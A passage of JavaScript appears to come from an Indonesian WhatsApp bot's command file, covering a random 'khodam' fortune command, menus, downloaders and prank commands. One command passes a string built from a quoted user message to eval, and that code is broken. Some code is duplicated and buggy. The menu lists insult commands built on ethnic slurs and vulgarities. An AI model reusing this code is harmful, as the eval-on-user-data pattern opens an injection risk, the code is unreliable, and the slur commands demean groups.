					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					Reply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
		
			db.users[m.sender].limit -= 3;
await m.reply(`-3⚡ limit terpakai✓ sisa limit ${db.users[m.sender].limit}`)
break ;



case 'cekkhodam': case 'cekkodam': case 'kodam': {
 const defaultLang = 'id';
 const gtts = require( 'node-gtts')
 // Penanganan input nama
 let lana;
 if (args.length === 0 || !args[0]) {
 return m.reply('Harap masukkan nama kamu/nama orang lain.');
 } else {
 name = args[0];
 }

 let lang = args[1];
 if (!lang || lang.length !== 2) {
 lang = defaultLang;
 }
 
 const khodam = [
 "Singa",
 "kosoong atau tidak ada",
 "Harimau",
 "Elang",
 "Serigala",
 "Naga",
 "Gajah",
 "Kuda",
 "Macan Tutul",
 "Kerbau",
 "Burung Hantu",
 "Burung Rajawali",
 "Ikan Hiu",
 "Lumba-Lumba",
 "Ular",
 "Kura-Kura",
 "Tupai",
 "Paus",
 "Kelelawar",
 "Kijang",
 "Banteng",
 "Rusa",
 "Anjing",
 "Kucing",
 "Buaya",
 "Kambing",
 "Kuda Nil",
 "Bebek",
 "Angsa",
 "Ayam",
 "Merpati",
 "Burung Beo",
 "Burung Kenari",
 "Burung Kakatua",
 "Bunglon",
 "Cicak",
 "Kodok",
 "Katak",
 "Tikus",
 "Landak",
 "Kanguru",
 "Koala",
 "Panda",
 "Beruang",
 "Rubah",
 "Lynx",
 "Leopard",
 "Jaguar",
 "Cheetah",
 "Badak",
 "Zebra",
 "Antelop",
 "Unta",
 "Alpaka",
 "Llama",
 "Serigala Abu-abu",
 "Serigala Merah",
 "Serigala Putih",
 "Lynx",
 "Harimau Putih",
 "Harimau Siberia",
 "Harimau Sumatra",
 "Gorila",
 "Orangutan",
 "Simpanse",
 "Monyet",
 "Babun",
 "Lemur",
 "Iguana",
 "Komodo",
 "Salamander",
 "Belut",
 "Sotong",
 "Gurita",
 "Kepiting",
 "Lobster",
 "Udang",
 "Kupu-kupu",
 "Lebah",
 "Tawon",
 "Kumbang",
 "Belalang",
 "Jangkrik",
 "Semut",
 "Kecoak",
 "Laba-laba",
 "Kalajengking",
 "Serangga Tongkat",
 "Naga Laut",
 "Kuda Laut",
 "Duyung",
 "Putri Duyung",
 "Burung Kolibri",
 "Burung Hantu Salju",
 "Burung Puyuh",
 "Burung Gagak",
 "Burung Pelikan",
 "Burung Albatros",
 "Burung Flamingo",
 "Burung Hering",
 "Burung Camar",
 "Burung Pinguin",
 "Cincin",
 "Batu Akik",
 "Keris",
 "Tongkat",
 "Pusaka",
 "Patung",
 "Mustika",
 "Tasbih",
 "Kalung",
 "Gelang",
 "Permata",
 "Pedang",
 "Mata Uang",
 "Wesi Kuning",
 "Serat Tali",
 "Belati",
 "Cundrik",
 "Selendang",
 "Jarum",
 "Tombak",
 "Kerikil",
 "Kendi",
 "Kain Kafan",
 "Topi",
 "Payung",
 "Sandal",
 "Kacamata",
 "Sabuk",
 "Sarung",
 "Tali Ikat Pinggang",
 "Surat",
 "Kunci",
 "Lilin",
 "Peniti",
 "Sisir",
 "Cermin",
 "Kendi Air",
 "Piring",
 "Gelas",
 "Mangkuk",
 "Sendok",
 "Sapu",
 "Gayung",
 "Tikar",
 "Bantal",
 "Guci",
 "Lentera",
 "Lampu",
 "Buku",
 "Pena",
 "Dupa",
 "Asbak",
 "Cangkir",
 "Gantungan Kunci",
 "Kalender",
 "Sepeda",
 "Lukisan",
 "Batu Kerikil",
 "Batu Kali",
 "Kipas",
 "Peci",
 "Sorban",
 "Rokok",
 "Topeng",
 "Gamelan",
 "Angklung",
 "Suling",
 "Wayang",
 "Kuda-Kudaan",
 "Sepatu",
 "Jam Tangan",
 "Kosong atau tidak adaa"
];


 const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
 let text = `Khodam ${m.pushName} adalah ${randomKhodam}`;
function tts(text, lang = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath = (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
} 
 


 let res;
 try {
 res = await tts(text, lang);
 } catch (e) {
 m.reply(e + '');
 res = await tts(text, defaultLang);
 } finally {
 m.reply(text)
 if (res) {
await Ditss.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: m });
 }
 }
};
//D|ts si pler 🐎
break 



case "all-all":{
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
//let totalreg = Object.keys(db.list().user).length
const xmenu_oh = `*乂 A I - M E N U 乂*

> ┌ ◦ *simi* : 
> └ ◦ *ai* :
> ┌ ◦ *llama* : (error)
> └ ◦ *joko* :
> ┌ ◦ *ai-perseverance* : 
> └ ◦ *logic* :

*乂 G R O U P - M E N U 乂*

> ┌ ◦ *on/off* : 
> └ ◦ *kick* :
> ┌ ◦ *demote* : 
> └ ◦ *promote* :
> ┌ ◦ *open* : 
> └ ◦ *close* :
> ┌ ◦ *-* : 
> └ ◦ *-* :

*乂 G R O U P - M E N U 乂*

> ┌ ◦ *${ki}tebakgambar${ka}* : 
> └ ◦ *${ki}tebakanime${ka}* :
> ┌ ◦ *${ki}tebakkabupaten${ka}* : 
> └ ◦ *${ki}tebaklagu${ka}* :
> ┌ ◦ *${ki}kuis${ka}* : 
> └ ◦ *${ki}tebakkalimat${ka}* :
> ┌ ◦ *${ki}tebakkata${ka}* : 
> └ ◦ *${ki}tebaklirik${ka}* :
> ┌ ◦ *${ki}tebakkimia${ka}* : 
> └ ◦ *${ki}tebakbendera${ka}* :
> ┌ ◦ *${ki}susunkata${ka}* : 
> └ ◦ *${ki}asahotak${ka}* :
> ┌ ◦ *${ki}siapakahaku${ka}* : 
> └ ◦ *${ki}caklontong${ka}* :
> ┌ ◦ *${ki}math${ka}* : 
> └ ◦ *${ki}family100${ka}* :

*乂 DOWNLOAD - M E N U 乂*

> ┌ ◦ *${ki}igdl${ka}* : 
> └ ◦ *${ki}play${ka}* :
> ┌ ◦ *${ki}ytmp3${ka}* : 
> └ ◦ *${ki}ytmp4${ka}* :
> ┌ ◦ *${ki}capcut${ka}* : 
> └ ◦ *${ki}tiktok${ka}* :
> ┌ ◦ *${ki}tiktokslide${ka}* : 
> └ ◦ *${ki}ttmp3${ka}* :
> ┌ ◦ *${ki}mediafire${ka}* : 
> └ ◦ *${ki}gdrive${ka}* :
> ┌ ◦ *${ki}threads${ka}* : 
> └ ◦ *${ki}videy${ka}* :
> ┌ ◦ *${ki}spotify${ka}* : 
> └ ◦ *${ki}gitclone${ka}* :

*乂 R P G - M E N U 乂*

> ┌ ◦ *${ki}faketweet${ka}* : 
> └ ◦ *${ki}twt${ka}* :
> ┌ ◦ *${ki}remini${ka}* : 
> └ ◦ *${ki}tourl${ka}* :
> ┌ ◦ *${ki}tourl2${ka}* : 
> └ ◦ *${ki}ssweb${ka}* :
> ┌ ◦ *${ki}nobg${ka}* : 
> └ ◦ *${ki}translate${ka}* :
> ┌ ◦ *${ki}qc${ka}* : 
> └ ◦ *${ki}tohd${ka}* :
> ┌ ◦ *${ki}shortlink${ka}* : 
> └ ◦ *${ki}shortlink2${ka}* :
> ┌ ◦ *${ki}enc${ka}* : 
> └ ◦ *${ki}enchard${ka}* :
> ┌ ◦ *${ki}vtuber${ka}* : 
> └ ◦ *${ki}infogempa${ka}* :
> ┌ ◦ *${ki}ceknik${ka}* : 
> └ ◦ *${ki}creatqr${ka}* :
> ┌ ◦ *${ki}toimg${ka}* : 
> └ ◦ *${ki}tovn${ka}* :

*乂 CERPEN M E N U 乂*
 ╭┈──────────────────
> ╰•.ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ
> ╰•.ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴅᴀᴇʀᴀʜ
> ╰•.ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀɪɴɢɢʀɪꜱ
> ╰•.ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴊᴀᴡᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀꜱᴜɴᴅᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀɪꜱʟᴀᴍɪ
> ╰•.ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀᴘᴇʀᴛᴀᴍᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀʀᴏᴍᴀɴᴛɪꜱ
> ╰•.ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴅɪʜ
> ╰•.ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇɢɪᴛɪɢᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴊᴀᴛɪ
> ╰•.ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ
> ╰•.ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ
> ╰•.ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ
> ╰•.ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ
> ╰•.ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴋɪꜱᴀʜɴʏᴀᴛᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ
> ╰•.ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ
> ╰•.ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ
> ╰•.ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ
> ╰•.ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴀᴛᴀʜʜᴀᴛɪ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴀʟᴀᴍᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ
> ╰•.ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ
> ╰•.ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ
> ╰•.ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ
> ╰•.ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ
> ╰•.ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ
> ╰•.ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ

*乂 OWNER- M E N U 乂*

> ┌ ◦ *${ki}addprem${ka}* : 
> └ ◦ *${ki}delprem${ka}* :
> ┌ ◦ *${ki}addowner${ka}* : 
> └ ◦ *${ki}autoread${ka}* :
> ┌ ◦ *${ki}autopromosi${ka}* : 
> └ ◦ *${ki}autoreadsw${ka}* :
> ┌ ◦ *${ki}autotyping${ka}* : 
> └ ◦ *${ki}addplugins${ka}* :
> ┌ ◦ *${ki}addcase${ka}* : 
> └ ◦ *${ki}listplugins${ka}* :
> ┌ ◦ *${ki}delplugins${ka}* : 
> └ ◦ *${ki}getplugins${ka}* :
> ┌ ◦ *${ki}saveplugins${ka}* : 
> └ ◦ *${ki}addowner${ka}* :
> ┌ ◦ *${ki}delowner${ka}* : 
> └ ◦ *${ki}self/public${ka}* :
> ┌ ◦ *${ki}setimgmenu${ka}* : 
> └ ◦ *${ki}setimgfake${ka}* :
> ┌ ◦ *${ki}setppbot${ka}* : 
> └ ◦ *${ki}clearsession${ka}* :
> ┌ ◦ *${ki}upchannel2${ka}* : 
> └ ◦ *${ki}upchannel${ka}* :
> ┌ ◦ *${ki}joinch${ka}* : 
> └ ◦ *${ki}joingc${ka}* :
> ┌ ◦ *${ki}listgc${ka}* : 
> └ ◦ *${ki}getcase${ka}* :
> ┌ ◦ *${ki}addcase${ka}* : 
> └ ◦ *${ki}upch-aud${ka}* :
> ┌ ◦ *${ki}getsc${ka}* : 
> └ ◦ *${ki}sendsc${ka}* :
> ┌ ◦ *${ki}restartbot${ka}* : 
> └ ◦ *${ki}resetdb${ka}* :
> ┌ ◦ *${ki}clearchat${ka}* : 
> └ ◦ *${ki}ban${ka}* :
> ┌ ◦ *${ki}unban${ka}* : 
> └ ◦ *${ki}on/off${ka}* :
> ┌ ◦ *${ki}block${ka}* : 
> └ ◦ *${ki}unblock${ka}* :
> ┌ ◦ *${ki}${ka}* : 
> └ ◦ *${ki}${ka}* :
> ┌ ◦ *${ki}${ka}* : 
> └ ◦ *${ki}${ka}* :

*乂 F U N - M E N U 乂*
> ┌ ◦ cekkontol_
> └ ◦ cekganteng_
> ┌ ◦ cekcantik_
> └ ◦ cekmemek_ 
> ┌ ◦ cekkhodam_ 
> └ ◦ checkme_ 
> ┌ ◦ kontol_
> └ ◦ cabul_ 
> ┌ ◦ tolol_ 
> └ ◦ sunda_
> ┌ ◦ goblog/goblok_ 
> └ ◦ idiot_ 
> ┌ ◦ gay_
> └ ◦ jomok_ 
> ┌ ◦ bajingan_ 
> └ ◦ munafik_
> ┌ ◦ kontol_
> └ ◦ yatim_ 
> ┌ ◦ poke_ 
> └ ◦ pembokep_ 
> ┌ ◦ fembokef_
> └ ◦ pengocok_
> ┌ ◦ hitam_
> └ ◦ hytam_ 
> ┌ ◦ bego_ 
> └ ◦ jawa_ 
> ┌ ◦ wibu_ 
> └ ◦ stress_
> ┌ ◦ miskin_ 
> └ ◦ cantik_ 
> ┌ ◦ ganteng_
> └ ◦ setan_
> ┌ ◦ manis_
> └ ◦ babi_ 
> ┌ ◦ cina_ 
> └ ◦ atheis_ 
> ┌ ◦ papua_
> └ ◦ pengentot_ 
> ┌ ◦ seksi_ 
> └ ◦ kawai_ 
> ┌ ◦ tercindo_ 
> └ ◦ cabul_
> ┌ ◦ fuckboy_ 
> └ ◦ fuckgirl_
> ┌ ◦ playboy_ 
> └ ◦ playgirl_
> ┌ ◦ sange_
> └ ◦ hot_
> ┌ ◦ sangean_

*乂 CPANEL M E N U 乂*

> ┌ ◦ *${ki}panelmenu${ka}* : 
> └ ◦ *${ki}listadmin-v2${ka}* :
> ┌ ◦ *${ki}listpanel-v2${ka}* : 
> └ ◦ *${ki}deladmin-v2${ka}* :
> ┌ ◦ *${ki}delpanel-v2${ka}* : 
> └ ◦ *${ki}cadmin-v2${ka}* :
> ┌ ◦ *${ki}1gb-v2${ka}* : 
> └ ◦ *${ki}2gb-v2${ka}* :
> ┌ ◦ *${ki}3gb-v2${ka}* : 
> └ ◦ *${ki}4gb-v2${ka}* :
> ┌ ◦ *${ki}5gb-v2${ka}* : 
> └ ◦ *${ki}6gb-v2${ka}* :
> ┌ ◦ *${ki}7gb-v2${ka}* : 
> └ ◦ *${ki}8gb-v2${ka}* :
> ┌ ◦ *${ki}9gb-v2${ka}* : 
> └ ◦ *${ki}unlimited-v2${ka}* :

*乂 CPANEL M E N U 乂*

> ┌ ◦ *${ki}panelmenu2${ka}* : 
> └ ◦ *${ki}listadmin${ka}* :
> ┌ ◦ *${ki}listpanel${ka}* : 
> └ ◦ *${ki}deladmin${ka}* :
> ┌ ◦ *${ki}delpanel${ka}* : 
> └ ◦ *${ki}cadmin${ka}* :
> ┌ ◦ *${ki}1gb${ka}* : 
> └ ◦ *${ki}2gb${ka}* :
> ┌ ◦ *${ki}3gb${ka}* : 
> └ ◦ *${ki}4gb${ka}* :
> ┌ ◦ *${ki}5gb${ka}* : 
> └ ◦ *${ki}6gb${ka}* :
> ┌ ◦ *${ki}7gb${ka}* : 
> └ ◦ *${ki}8gb${ka}* :
> ┌ ◦ *${ki}9gb${ka}* : 
> └ ◦ *${ki}unlimited${ka}* :`

const resize = async(buffer, ukur1, ukur2) => {
 return new Promise(async(resolve, reject) => {
 let jimp = require('jimp')
 var baper = await jimp.read(buffer);
 var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
 resolve(ab)
 })
}

let deku = fs.readFileSync('./source/media/ch1.jpg')
let get = await resize(deku, 100, 100)
await Ditss.sendMessage(m.chat, {
 document: fs.readFileSync('./case.js'), fileName: `${botname} ${versi}`, mimetype: 'image/null', fileLength: 0, pageCount: '', jpegThumbnail: get,
 caption: xmenu_oh,
 footer: "Dits\nnot sepuh",
 buttons: [
 {
 buttonId: ".infobot", 
 buttonText: {
 displayText: 'info bot'
 }
 }, {
 buttonId: ".ping", 
 buttonText: {
 displayText: "speed bot"
 }
 }
],
 viewOnce: true,
 headerType: 6,
 contextInfo: {
 isForwarded: true,
 forwardingScore: 99999,
 externalAdReply: {
 showAdAttribution: true,
 title: ` Hikaa | Perseverance`,
 mediaType: 1,
 previewType: 1,
 body: `Hikaa`,
 //previewType: "PHOTO",
 thumbnail: fs.readFileSync('./source/media/ch1.jpg'),
 renderLargerThumbnail: true,
 mediaUrl: null,
 sourceUrl: null,
 },
 forwardedNewsletterMessageInfo: {
 newsletterJid: idSaluran,
 serverMessageId: -1,
 newsletterName: `Menu By: Hikaa`,
 }
 }
}, { quoted: m });

//await m.reply({ audio: { url: 'https://files.catbox.moe/s7avpq.mp3' }, mimetype: 'audio/mpeg', ptt: true })
}
break



case 'tourl3': {
if (!/video/.test(mime) && !/image/.test(mime)) reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
if (!quoted) reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
//let { TelegraPh } = require('./all/uploader.js')
let media = await Ditss.downloadAndSaveMediaMessage(quoted)
let anu = await fileIO(media)
reply(util.format(anu))
await fs.unlinkSync(media)
}
break



			case 'kudaa':
			case 'ntahlahh': {
				Ditss.sendMessage(m.chat,{
                   image: {url:ppuser},
					caption: "ntahlah",
					footer: `serius??\n`,
					buttons: [
    
						{
							buttonId: `${prefix}bkp`,
							buttonText: {
								displayText: "tanggal 6 sekolah 😨"
							}
						},
						{
							buttonId: `${prefix}bkp`,
							buttonText: {
								displayText: "tanggal 6 sekolah 😨"
							}
						}, 
						{
							buttonId: `${prefix}bkp`,
							buttonText: {
								displayText: "tanggal 6 sekolah 😨"
							}
						},
						{
							buttonId: `${prefix}bkp`,
							buttonText: {
								displayText: "tanggal 6 sekolah 😨"
							}
						},
						{
							buttonId: `${prefix}bkp`,
							buttonText: {
								displayText: "tanggal 6 sekolah 😨"
							}
						},
						{
							buttonId: `${prefix}bkp`,
							buttonText: {
								displayText: "tanggal 6 sekolah 😨"
							}
						},
						{
							buttonId: `${prefix}bokep`,
							buttonText: {
								displayText: "tes aja🗿"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			break



			case 'kids':
			case 'mwhehe': {
				const caption = `hahh🗿`;
				Ditss.sendMessage(m.chat,{
					image: {url: ppuser},
					caption: caption,
					footer: botName,
					buttons: [
						{
							buttonId: `${prefix}bokep`,
							buttonText: {
								displayText: "🗿"
							}
						},
			 			{
							buttonId: `${prefix}bokep`,
							buttonText: {
								displayText: "🗿"
							}
						},
						{
							buttonId: `${prefix}bokep`,
							buttonText: {
								displayText: "🗿"
							}
						},
						{
							buttonId: `${prefix}bkp`,
							buttonText: {
								displayText: "lajutt"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			break



case "colong": {
 let gw = `(async () => { let msg = await bail.generateWAMessageFromContent(cht.sender, ${JSON.stringify(m.quoted, null, 2)}, {})`
 + `\n await Ditss.relayMessage(msg.key.remoteJid, msg.message, {`
 + `\n messageId: msg.key.id`
 + `\n })`
 + `\n})()`
 let random = Math.floor(Math.random() * 10000)
 await eval(`
 case "${random}": {
 ${gw.replace("m.sender","quoted.id")}
 }
 break` )
 await Ditss.sendMessage(m.chat, { text: gw }, { quoted: m })
 }
 break



case 'buatpanel':
			case 'cpanel':{
      if (!text) return m.reply(example("asuma"))
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = `${ki}silahkan pilih rame server panel${ka}`;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
													"messageContextInfo": {								"deviceListMetadata": {},								"deviceListMetadataVersion": 2
							},							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: `\n\n${botname} the cpanel`
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: {url: "https://telegra.ph/file/8b49f9438b266fc7a9730.jpg"}}, { upload: Ditss.waUploadToServer })), 
									title: '',
									subtitle: '',
									hasMediaAttachment: false
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
										{
											"name": "single_select",
											"buttonParamsJson": `{
												"title": "pilih-disini",
												"sections": [{
													"title": "Select Menu",
													"rows": [{
														"title": "Create Ram 2gb",
														"description": "",
														"id": "${prefix}2gb ${text}"
													},
													{
														"title": "Create Ram 3gb",
														"description": "",
														"id": "${prefix}3gb ${text}"
													},
													{
														"title": "Create Ram 4gb",
														"description": "",
														"id": "${prefix}4gb ${text}"
													},
													{
														"title": "Create Ram 5gb",
														"description": "",
														"id": "${prefix}5gb ${text}"
													},
													{
														"title": "Create Ram 6gb",
														"description": "",
														"id": "${prefix}6gb ${text}"
													},
													{
														"title": "Create Ram 7gb",
														"description": "",
														"id": "${prefix}7gb ${text}"
													},
													{
														"title": "Create Ram 8gb",
														"description": "",
														"id": "${prefix}8gb ${text}"
													},
													{
															"title": "Create Ram 9gb",
														"description": "",
														"id": "${prefix}9gb ${text}"
													},
													{																		"title": "Create Unlimited",
														"description": "",
														"id": "${prefix}unli ${text}"
													}]
												}]
											}`
										},
										{
											"name": "quick_reply",
											"buttonParamsJson": `{\"display_text\":\"owner\",\"url\":\"https://api.whatsapp.com/send?phone=6285882135288\",\"merchant_url\":\"https://www.google.com\"}`
										}
                  //batas
                     
                     //batas
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "create panell",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Ditss.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			break



case 'capcutdl': case 'capcut':
//if (!isRegistered) return registerbut(noregis)
if (!text) return reply(`Linknya?\nExample: *.${command} https://www.capcut.com/template-detail/7254579764793511170?template_id=7254579764793511170&share_token=50c68e86-b857-40d7-9056-6c5db8b37c4c&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1*`)
reply(mess.wait)
 var resk = await fetch(`https://aemt.me/download/capcut?url=${text}`)
 let json = await resk.json()
 let v = json.result
 let cap = `Suksess Download Media`
Ditss.sendMessage(m.chat, { video: { url: v.video_ori }, caption: cap }, m)
//D|ts si pler 🐎
break 



case 'capcutdl': case 'capcut':
//if (!isRegistered) return registerbut(noregis)
if (!text) return reply(`Linknya?\nExample: *.${command} https://www.capcut.com/template-detail/7254579764793511170?template_id=7254579764793511170&share_token=50c68e86-b857-40d7-9056-6c5db8b37c4c&enter_from=template_detail&region=ID&language=in&platform=copy_link&is_copy_link=1*`)
reply(mess.wait)
 var resk = await fetch(`https://aemt.me/download/capcut?url=${text}`)
 let jsonn = await resk.jsonn()
 let vv = jsonn.result
 let capp = `Suksess Download Media`
Ditss.sendMessage(m.chat, { video: { url: vv.video_ori }, caption: capp }, m)
//D|ts si pler 🐎
break 



case 'yts': case 'ytsearch': {
//if (!isRegistered) return registerbut(noregis)
if (!text) throw `Example : ${prefix + command} story wa anime`
 let [l, r] = text.split`|`
 if (!l) l = ''
 if (!r) r = ''
 const more = String.fromCharCode(8206)
 const readMore = more.repeat(4001)
 let redmo = l + readMore + r
 let anu = (await yts(text)).all
 let video = anu.filter(v => v.type === 'video') 
let channel = anu.filter(v => v.type === 'channel') 
let teks = `*${monospa('Hasil Pencarian YouTube 👇')}*\n${redmo}${channel.map(v => `*${v.name}* (${v.url})\n_${v.subCountLabel} (${v.subCount}) Subscriber_\n${v.videoCount} video\n========================`.trim()

).join("\n")}`+`${video.map(v => `*${v.title}* (${v.url})\nDuration: ${v.timestamp}\nUploaded ${v.ago}
\n${v.views} views\n========================`.trim() ).join("\n")}`
let image = channel.length ? channel[0].image : video.length ? video[0].image : urlmenu.main

let sections = [{
		title: global.namebot2, 
		highlight_label: 'start chats', 
		rows: [{
			header: global.namebot2, 
	title: "Menu",
	description: `kembali ke menu !`, 
	id: '.menu'
	},
	{
		header: global.namebot2, 
		title: "Owner Bot", 
		description: "Owner bot, pemilik bot", 
		id: '.owner'
	}]
}]

video.forEach(async(data) => {
sections.push({
	title: data.title, 
	rows: [{
		title: "Get Video", 
		description: `Get video from "${data.title}"`, 
		id: `.ytmp4 ${data.url}`
		}, 
		{
		title: "Get Audio", 
		description: `Get audio from "${data.title}"`, 
		id: `.ytmp3 ${data.url}`
		}]
	}) 
}) 
let listMessage = {
    title: 'Download Media!!', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: teks
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: global.namebot2
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 subtitle: global.namebot2,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: image }}, { upload: Ditss.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "single_select",
 "buttonParamsJson": JSON.stringify(listMessage) 
 }, 
 ],
 })
 })
 }
 }
}, {})

await Ditss.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
//D|ts si pler 🐎
break 



case 'unli-kontol': {

const hoho = [
  {
   name: "cta_copy",
   buttonParamsJson: JSON.stringify({
      display_text: "copy pasword",
      copy_code: "muka lu kek kontol"
   })
},
 {
   name: "cta_copy",
   buttonParamsJson: JSON.stringify({
      display_text: "copy username",
      copy_code: "muka lu kek kontol"
   })
},
{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "server",
      url: `https://www.youtube.com/@paaditt`,
      merchant_url: `https://www.youtube.com/@paaditt`
   })
   }
]
Ditss.sendButton(m.chat, hoho, m,{
 footer: 'BERIKUT DATA AKUN PA EL ANDA'})
}
break



case 'jadibot':
case 'botjadi': {
 if (args[0] === 'on') {
welcome = true
m.reply(`${command} is enabled`)
 } else if (args[0] === 'off') {
welcome = false
m.reply(`${command} is disabled`)
 }else {
await Ditss.sendMessage(m.chat, { poll: { name: 'Pilih metode', values: [`${command} on`,`${command} off`] } }, { quoted: m})
}
}
break



case 'toone': case 'toviewonce': { 
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await Ditss.downloadAndSaveMediaMessage(quoted)
Ditss.sendMessage(m.chat, {image: {url:anuan}, caption: `muka lu kek pler`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await Ditss.downloadAndSaveMediaMessage(quoted)
Ditss.sendMessage(m.chat, {video: {url:anuanuan}, caption: `muka lu kek pler`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break





